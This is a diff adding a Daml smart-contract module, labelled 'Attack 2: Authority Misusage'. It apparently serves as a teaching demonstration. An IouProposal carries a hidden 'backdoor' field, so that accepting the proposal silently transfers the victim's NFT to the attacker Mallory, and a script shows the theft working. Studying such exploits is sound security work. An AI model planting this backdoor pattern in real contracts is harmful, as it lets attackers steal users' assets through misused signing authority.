@@ -1,0 +1,102 @@
+-------------------------------------
+---- Attack 2: Athority Missuage ----
+-------------------------------------
+
+{-# LANGUAGE ApplicativeDo #-}
+
+module I_MaliciousIou where
+
+import qualified A_Asset as Asset
+import qualified F_TokenV2 as Token
+import qualified B_RockBandNFT as NFT
+
+import DA.List
+import Daml.Script
+
+
+template Iou with
+    issuer : Party
+    owner : Party
+    amount : Int
+  where
+    signatory issuer, owner
+
+    interface instance Asset.Asset for Iou where
+      view = Asset.View owner
+      assetOwner = owner
+      transfer newOwner = do
+        cid <- create $ IouProposal this newOwner None
+        pure $ toInterfaceContractId cid
+
+    interface instance Token.Token for Iou where
+      view = Token.View issuer owner amount "CHF"
+      tokenIssuer = issuer
+      tokenAmount = amount
+      tokenCurrency = "CHF"
+      split x = do
+        (cid1, cid2) <- splitImpl this x
+        pure (toInterfaceContractId cid1, toInterfaceContractId cid2)
+
+splitImpl : Iou -> Int -> Update (ContractId Iou, ContractId Iou)
+splitImpl iou x =  do
+  let restAmount = iou.amount - x
+  splitCid <- create iou with amount = x
+  restCid <- create iou with amount = iou.amount - x
+
+  pure (splitCid, restCid)
+
+template IouProposal
+  with
+    iou: Iou
+    proponee: Party
+    backdoor: Optional (ContractId Asset.Asset)
+  where
+    signatory signatory iou
+    observer proponee
+    interface instance Asset.Proposal for IouProposal where
+      view = Asset.View iou.owner
+      proposalAsset = toInterface iou
+      proposalProponee = proponee
+      accept = do
+        case backdoor of
+          Some assetId -> do
+            proposalId <- exercise assetId (Asset.Transfer iou.owner)
+            exercise proposalId Asset.Accept
+            pure ()
+          None ->
+            pure ()
+        cid <- create $ iou with owner = proponee
+        pure $ toInterfaceContractId cid
+      cancel = do
+        cid <- create iou
+        pure $ toInterfaceContractId cid
+
+
+main : Script ()
+main = script do
+  band <- allocateParty "Iron Furry"
+  bank <- allocateParty "Bank"
+  alice <- allocateParty "Alice"
+  mallory <- allocateParty "Mallory"
+  public <- allocateParty "Public"
+
+  alicesNft <- submitMulti [band, alice] [] do
+    nftId <- createCmd (NFT.NFT band "Metal Storm" alice public)
+    pure $ toInterfaceContractId @Asset.Asset nftId
+
+  nftIds <- queryFilter @NFT.NFT public (\nft -> nft.band == band)
+
+  proposalId <- mallory `submit`
+     createCmd IouProposal with
+      iou = Iou with
+        issuer = mallory
+        owner = mallory
+        amount = 42
+      proponee = alice
+      -- backdoor = None
+      backdoor = Some (toInterfaceContractId (head nftIds)._1)
+
+  iou <- submitMulti [alice] [public] do
+    exerciseCmd (toInterfaceContractId @Asset.Proposal proposalId) Asset.Accept
+
+  pure ()
